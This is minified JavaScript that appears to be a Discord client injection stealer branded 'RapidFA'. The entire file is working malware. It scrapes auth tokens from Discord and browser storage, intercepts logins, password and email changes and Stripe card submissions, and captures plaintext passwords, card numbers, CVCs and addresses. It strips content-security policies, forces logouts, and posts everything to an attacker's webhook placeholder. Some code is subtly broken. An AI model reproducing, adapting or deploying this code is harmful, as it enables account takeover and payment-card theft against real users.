const fs=require("fs"),path=require("path"),{BrowserWindow:BrowserWindow,session:session}=require("electron"),https=require("https"),querystring=require("querystring"),electron=require("electron"),webhook="%WEBHOOK_LINK%";try{var dir=__dirname.split("\\"),paths=[`${dir[0]}/Users/${dir[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,`${dir[0]}/Users/${dir[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`];for(i=0;i<paths.length;i++)grabtoken(paths[i]);var bal=[],bri=[],staff=[],partner=[],event=[],gbug=[],brav=[],ES=[],goldbug=[],dev=[];function grabtoken(e){try{fs.readdir(e,(t,r)=>{if(r){var n=r.filter(e=>e.endsWith("ldb"));for(a=0;a<n.length;a++)fs.readFile(`${e}/${n[a]}`,"utf-8",function(e,t){var[r]=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(t)||/"mfa\.[\d\w_-]{84}"/.exec(t)||[void 0];r&&fetch("https://discordapp.com/api/v9/users/@me/relationships",{headers:{authorization:r.slice(1,-1)}}).then(e=>e.json()).then(e=>{if("401: Unauthorized"!=e.message)for(i=0;i<e.length;i++)1==(1&e[i].user.public_flags)&&staff.push(i),2==(2&e[i].user.public_flags)&&partner.push(i),4==(4&e[i].user.public_flags)&&event.push(i),8==(8&e[i].user.public_flags)&&gbug.push(i),64==(64&e[i].user.public_flags)&&brav.push(i),128==(128&e[i].user.public_flags)&&bri.push(i),256==(256&e[i].user.public_flags)&&bal.push(i),512==(512&e[i].user.public_flags)&&ES.push(i),16384==(16384&e[i].user.public_flags)&&goldbug.push(i),131072==(131072&e[i].user.public_flags)&&dev.push(i),setTimeout(()=>{var e={username:"RapidFA",content:"",embeds:[{title:"Grabbed Someone","description:":"",fields:[{name:"**FRIEND INFOS**:",value:`STAFF: ${staff.length}\nPARTNER: ${partner.length}\nEVENTS: ${event.length}\nGreen BugHunter: ${gbug.length}\nBRAVERY: ${brav.length}\nBrilliance: ${bri.length}\nBALANCE: ${bal.length}\nEARLY SUPPORT: ${ES.length}\nGold BugHunter: ${gbug.length}\nDiscord Developper: ${dev.length}`,inline:!0},{name:"**TOKEN**:",value:`${r}`}],author:{name:"RapidFA"},color:43690,footer:{text:"RapidFA"},thumbnail:{url:"http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif"}}]};SendToWebhook(JSON.stringify(e))},10)})})}})}catch(e){}}}catch(e){}function FirstTime(){if(!fs.existsSync(path.join(__dirname,"RapidFA")))return!0;return fs.rmdirSync(path.join(__dirname,"RapidFA")),BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()',!0).then(e=>{}),!1}const Filter={urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]};function SendToWebhook(e){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `,!0).then(e=>{})}function GetNitro(e){return 0==e?"No Nitro":1==e?"Nitro Classic":2==e?"Nitro Boost":"No Nitro"}function GetBadges(e){var t="";return 1==(1&e)&&(t+="Staff,"),2==(2&e)&&(t+="Partner,"),4==(4&e)&&(t+="Hypesquad Event,"),8==(8&e)&&(t+="Green Bughunter,"),64==(64&e)&&(t+="Hypesquad Bravery,"),128==(128&e)&&(t+="HypeSquad Brillance,"),256==(256&e)&&(t+="HypeSquad Balance,"),512==(512&e)&&(t+="Early Supporter,"),16384==(16384&e)&&(t+="Gold BugHunter,"),131072==(131072&e)&&(t+="Discord Developer,"),""==t&&(t="None"),t}function Login(e,t,r){const a=BrowserWindow.getAllWindows()[0];a.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${r}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(n=>{a.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${r}");\n        xmlHttp.send( null );\n        xmlHttp.responseText;`,!0).then(s=>{a.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/guilds", false );\n        xmlHttp.setRequestHeader("Authorization", "${r}");\n        xmlHttp.send( null );\n        xmlHttp.responseText;`,!0).then(o=>{a.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );\n        xmlHttp.setRequestHeader("Authorization", "${r}");\n        xmlHttp.send( null );\n        xmlHttp.responseText;`,!0).then(i=>{a.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", http://ip-api.com/json/", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',!0).then(a=>{const l=JSON.parse(n),p=JSON.parse(s),d=JSON.parse(o),u=JSON.parse(i),c=JSON.parse(a);for(var m=0;m<d.length;m++)1==d[m].owner&&f.push(d[m].owner),setTimeout(()=>{if(void 0!==p.flags)var a="True";else a="False";var n={username:"RapidFA",content:"",embeds:[{title:"User Login","description:":"",fields:[{name:"**TAG**:",value:"```"+`${l.username}#${l.discriminator}`+"```",inline:!0},{name:"**ID**",value:"```"+`${l.id}`+"```",inline:!0},{name:"**Nitro:**",value:"```"+GetNitro(l.premium_type)+"```",inline:!0},{name:"**BADGES**: ",value:"```"+GetBadges(l.flags)+"```",inline:!0},{name:"**Server own**: ",value:"```"+f.length+"```",inline:!0},{name:"**FRIENDS COUNT**: ",value:"```"+u.length+"```",inline:!0},{name:"**BILING INFOS ?**: ",value:"```"+a+"```",inline:!0},{name:"**EMAIL**: ",value:"```"+e+"```",inline:!0},{name:"**PASSWORD**: ",value:"```"+t+"```",inline:!0},{name:"**MFA ?**: ",value:"```"+l.mfa_enabled+"```",inline:!0},{name:"**State**: ",value:"```"+c.country+"```",inline:!0},{name:"**IP**: ",value:"```"+c.query+"```"},{name:"**TOKEN**: ",value:"```"+r+"```"}],author:{name:"RapidFA"},color:43690,footer:{text:"RapidFA"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+l.id+"/"+l.avatar}}]};SendToWebhook(JSON.stringify(n))},100)})})})})})}function ChangePassword(e,t,r){const a=BrowserWindow.getAllWindows()[0];a.webContents.executeJavaScript(`\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n        xmlHttp.setRequestHeader("Authorization", "${r}");\n        xmlHttp.send( null );\n        xmlHttp.responseText;`,!0).then(n=>{a.webContents.executeJavaScript('\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n            xmlHttp.send( null );\n            xmlHttp.responseText;\n        ',!0).then(a=>{var s=JSON.parse(n),o={username:"RapidFA",content:"",embeds:[{title:"Password Changed",description:"**Username:**```"+s.username+"#"+s.discriminator+"```\n**ID:** ```"+s.id+"```\n**Nitro:** ```"+GetNitro(s.premium_type)+"```\n**Badges:**```"+GetBadges(s.flags)+"```\n**Email: **```"+s.email+"```\n**Old Password: **```"+e+"```\n**New Password: **```"+t+"```\n**Token:**```"+r+"```\n**IP: **```"+a+"```",author:{name:"RapidFA"},footer:{text:"RapidFA"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+s.id+"/"+s.avatar}}]};SendToWebhook(JSON.stringify(o))})})}function ChangeEmail(e,t,r){const a=BrowserWindow.getAllWindows()[0];a.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${r}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(n=>{a.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',!0).then(a=>{var s=JSON.parse(n),o={username:"RapidFA",content:"",embeds:[{title:"Email Changed",description:"**Username:**```"+s.username+"#"+s.discriminator+"```\n**ID:** ```"+s.id+"```\n**Nitro:** ```"+GetNitro(s.premium_type)+"```\n**Badges:**```"+GetBadges(s.flags)+"```\n**New Email: **```"+e+"```\n**Password: **```"+t+"```\n**Token:**```"+r+"```\n**IP**: ```"+a+"```",author:{name:"RapidFA"},footer:{text:"RapidFA"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+s.id+"/"+s.avatar}}]};SendToWebhook(JSON.stringify(o))})})}function CreditCardAdded(e,t,r,a,n,s,o,i,l,p){const d=BrowserWindow.getAllWindows()[0];d.webContents.executeJavaScript(`\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${p}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,!0).then(u=>{d.webContents.executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',!0).then(d=>{var c=JSON.parse(u),m={username:"RapidFA",content:"",embeds:[{title:"User Credit Card Added",description:"**Username:**```"+c.username+"#"+c.discriminator+"```\n**ID:**```"+c.id+"```\n**Email:**```"+c.email+"```\n**Nitro Type:**```"+GetNitro(c.premium_type)+"```\n**Badges:**```"+GetBadges(c.flags)+"```\n**Credit Card Number: **```"+e+"```\n**Credit Card Expiration: **```"+r+"/"+a+"```\n**CVC: **```"+t+"```\n**Country: **```"+l+"```\n**State: **```"+o+"```\n**City: **```"+s+"```\n**ZIP:**```"+i+"```\n**Street: **```"+n+"```\n**Token:**```"+p+"```\n**IP: **```"+d+"```",author:{name:"RapidFA"},footer:{text:"RapidFA"},thumbnail:{url:"https://cdn.discordapp.com/avatars/"+c.id+"/"+c.avatar}}]};SendToWebhook(JSON.stringify(m))})})}session.defaultSession.webRequest.onBeforeRequest(Filter,(e,t)=>{FirstTime()&&(e.url.startsWith("wss://")?t({cancel:!0}):t({cancel:!1}))}),session.defaultSession.webRequest.onHeadersReceived((e,t)=>{delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}})});const ChangePasswordFilter={urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v*/tokens"]};session.defaultSession.webRequest.onCompleted(ChangePasswordFilter,(e,t)=>{if(e.url.endsWith("login")&&200==e.statusCode){const t=JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),r=t.login,a=t.password;BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{Login(r,a,e)})}if(e.url.endsWith("users/@me")&&200==e.statusCode&&"PATCH"==e.method){const t=JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());if(null!=t.password&&null!=t.password&&""!=t.password){if(null!=t.new_password&&null!=t.new_password&&""!=t.new_password){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{ChangePassword(t.password,t.new_password,e)})}if(null!=t.email&&null!=t.email&&""!=t.email){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{ChangeEmail(t.email,t.password,e)})}}}if(e.url.endsWith("tokens")){const t=BrowserWindow.getAllWindows()[0],r=querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));t.webContents.executeJavaScript('var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token',!0).then(e=>{CreditCardAdded(r["card[number]"],r["card[cvc]"],r["card[exp_month]"],r["card[exp_year]"],r["card[address_line1]"],r["card[address_city]"],r["card[address_state]"],r["card[address_zip]"],r["card[address_country]"],e)})}}),module.exports=require("./core.asar");
